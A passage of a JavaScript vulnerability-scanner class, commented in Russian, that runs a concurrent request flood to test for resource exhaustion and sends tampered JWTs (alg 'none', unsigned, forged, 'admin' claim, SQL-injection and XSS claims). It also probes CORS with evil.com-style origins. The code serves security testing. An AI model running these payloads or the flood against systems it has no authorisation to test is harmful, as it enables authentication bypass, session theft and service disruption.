        console.log(`\n💣 ТЕСТИРОВАНИЕ RESOURCE EXHAUSTION (${iterations} запросов, конкурентность ${concurrency})`);
        
        const startTime = Date.now();
        let errors = 0;
        let slowResponses = 0;
        
        for (let i = 0; i < iterations; i += concurrency) {
            const batch = [];
            for (let j = 0; j < Math.min(concurrency, iterations - i); j++) {
                const payload = payloadGenerator(i + j);
                batch.push(this.requester.send(payload));
            }
            
            const results = await Promise.allSettled(batch);
            for (const res of results) {
                if (res.status === 'rejected') {
                    errors++;
                } else if (res.value.duration > 5000) {
                    slowResponses++;
                }
            }
            
            console.log(`   Прогресс: ${Math.min(i + concurrency, iterations)}/${iterations}`);
            await new Promise(r => setTimeout(r, 200));
        }
        
        const totalTime = Date.now() - startTime;
        const isVulnerable = errors > iterations * 0.1 || slowResponses > iterations * 0.3;
        
        const vulnerability = {
            type: 'RESOURCE_EXHAUSTION',
            severity: isVulnerable ? 'HIGH' : 'LOW',
            description: isVulnerable 
                ? `Сервер не выдержал нагрузку: ${errors} ошибок, ${slowResponses} медленных ответов`
                : 'Сервер стабилен под нагрузкой',
            details: { totalRequests: iterations, errors, slowResponses, totalTimeMs: totalTime }
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== 14. JWT / SESSION SECURITY ==========
    async testJwtSecurity(token, endpoint) {
        console.log(`\n🔑 ТЕСТИРОВАНИЕ JWT/SESSION БЕЗОПАСНОСТИ`);
        
        const tests = [
            { name: 'Истекший токен', token: this.modifyTokenExp(token, -3600) },
            { name: 'Токен с измененным алгоритмом (none)', token: this.jwtNoneAlgorithm(token) },
            { name: 'Пустой токен', token: '' },
            { name: 'Поддельный токен', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhhY2tlciIsImlhdCI6MTUxNjIzOTAyMn0.fake' },
            { name: 'Токен с измененным пользователем', token: this.modifyTokenClaim(token, 'sub', 'admin') },
            { name: 'Токен без подписи', token: token.split('.')[0] + '.' + token.split('.')[1] + '.' },
            { name: 'Токен с истекшим exp', token: this.modifyTokenClaim(token, 'exp', Math.floor(Date.now() / 1000) - 3600) },
            { name: 'Токен с exp в будущем', token: this.modifyTokenClaim(token, 'exp', Math.floor(Date.now() / 1000) + 999999999) },
            { name: 'Токен без exp', token: this.removeTokenClaim(token, 'exp') },
            { name: 'Токен с SQL инъекцией', token: this.modifyTokenClaim(token, 'sub', "1' OR '1'='1") },
            { name: 'Токен с XSS', token: this.modifyTokenClaim(token, 'name', '<script>alert(1)</script>') }
        ];
        
        const results = [];
        for (const test of tests) {
            const result = await this.requester.send({ ...endpoint, headers: { Authorization: `Bearer ${test.token}` } });
            const isVulnerable = result.status === 200;
            results.push({ ...test, status: result.status, vulnerable: isVulnerable });
            console.log(`   ${test.name}: ${isVulnerable ? '🔴 УЯЗВИМО' : '✓ Защищено'}`);
        }
        
        const vulnerability = {
            type: 'JWT_SECURITY',
            severity: results.some(r => r.vulnerable) ? 'CRITICAL' : 'LOW',
            description: results.some(r => r.vulnerable) 
                ? 'Обнаружены уязвимости в обработке JWT/сессий'
                : 'JWT/сессии обрабатываются безопасно',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // Вспомогательные функции для JWT
    modifyTokenExp(token, offsetSeconds) {
        try {
            const parts = token.split('.');
            if (parts.length !== 3) return token;
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            payload.exp = Math.floor(Date.now() / 1000) + offsetSeconds;
            const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
            return `${parts[0]}.${newPayload}.${parts[2]}`;
        } catch { return token; }
    }
    
    jwtNoneAlgorithm(token) {
        try {
            const parts = token.split('.');
            const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
            header.alg = 'none';
            const newHeader = Buffer.from(JSON.stringify(header)).toString('base64');
            return `${newHeader}.${parts[1]}.`;
        } catch { return token; }
    }
    
    modifyTokenClaim(token, claim, newValue) {
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            payload[claim] = newValue;
            const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
            return `${parts[0]}.${newPayload}.${parts[2]}`;
        } catch { return token; }
    }
    
    removeTokenClaim(token, claim) {
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            delete payload[claim];
            const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
            return `${parts[0]}.${newPayload}.${parts[2]}`;
        } catch { return token; }
    }
    
    // ========== 15. CORS MISCONFIGURATION ==========
    async testCORS(endpoint) {
        console.log(`\n🌐 ТЕСТИРОВАНИЕ CORS КОНФИГУРАЦИИ`);
        
        const origins = [
            'https://evil.com',
            'https://evil.com.',
            'https://evil.com.evil.com',
            'https://evil.com@legit.com',
            'null',
            'https://*.legit.com',
            'https://legit.com.evil.com',
            'http://evil.com',
            'https://evil.com:8080',
            'https://subdomain.evil.com'
        ];
        
        const results = [];
        
        for (const origin of origins) {
            console.log(`   Тест: Origin ${origin}`);
            
            const req = {
                ...(typeof endpoint === 'object' ? endpoint : { path: endpoint }),
                headers: { 'Origin': origin }
            };
            
            const result = await this.requester.send(req);
            const acao = result.headers?.['access-control-allow-origin'];
            const acac = result.headers?.['access-control-allow-credentials'];
            
            const isVulnerable = acao === '*' || acao === origin;
            const leaksCredentials = isVulnerable && acac === 'true';
            
            if (isVulnerable) {
                results.push({
                    origin,
                    acao,
                    acac,
                    vulnerable: true,
                    leaksCredentials
                });
                console.log(`   🔴 УЯЗВИМО: ACAO: ${acao}, ACAC: ${acac}${leaksCredentials ? ' (утечка сессий!)' : ''}`);
            } else {
                console.log(`   ✓ Безопасно: ACAO: ${acao || 'не задан'}`);
            }
            
            await new Promise(r => setTimeout(r, 100));
        }
        
        const vulnerability = {
            type: 'CORS_MISCONFIGURATION',
            severity: results.some(r => r.leaksCredentials) ? 'CRITICAL' : (results.length > 0 ? 'HIGH' : 'LOW'),
            description: results.some(r => r.leaksCredentials)
                ? 'CORS настроен с ACAO: * и ACAC: true – возможен перехват сессий'
                : results.length > 0
                ? 'Обнаружены небезопасные CORS настройки'
                : 'CORS настроен безопасно',
            details: results
        };
        
        this.results.push(vulnerability);
        return vulnerability;
    }
    
    // ========== ОТЧЕТ ==========
    printReport() {
        console.log('\n' + '='.repeat(70));
        console.log('📊 ОТЧЕТ ПО ТЕСТАМ БЕЗОПАСНОСТИ');
        console.log('='.repeat(70));
        
        const critical = this.results.filter(r => r.severity === 'CRITICAL');
        const high = this.results.filter(r => r.severity === 'HIGH');
        const medium = this.results.filter(r => r.severity === 'MEDIUM');
        const low = this.results.filter(r => r.severity === 'LOW');
        
        console.log(`\n🔴 CRITICAL: ${critical.length}`);
        console.log(`🟠 HIGH: ${high.length}`);
        console.log(`🟡 MEDIUM: ${medium.length}`);
        console.log(`🟢 LOW: ${low.length}`);
        
        if (this.results.length > 0) {
            console.log('\n📋 ДЕТАЛИ:');
            [...critical, ...high, ...medium, ...low].forEach((r, i) => {
                console.log(`\n${i + 1}. [${r.severity}] ${r.type}`);
                console.log(`   ${r.description}`);
            });
        }
    }
    
    exportResults() {
        return {
            timestamp: new Date().toISOString(),
            totalTests: this.results.length,
            summary: {
                critical: this.results.filter(r => r.severity === 'CRITICAL').length,
                high: this.results.filter(r => r.severity === 'HIGH').length,
                medium: this.results.filter(r => r.severity === 'MEDIUM').length,
                low: this.results.filter(r => r.severity === 'LOW').length
            },
            results: this.results
        };
    }
}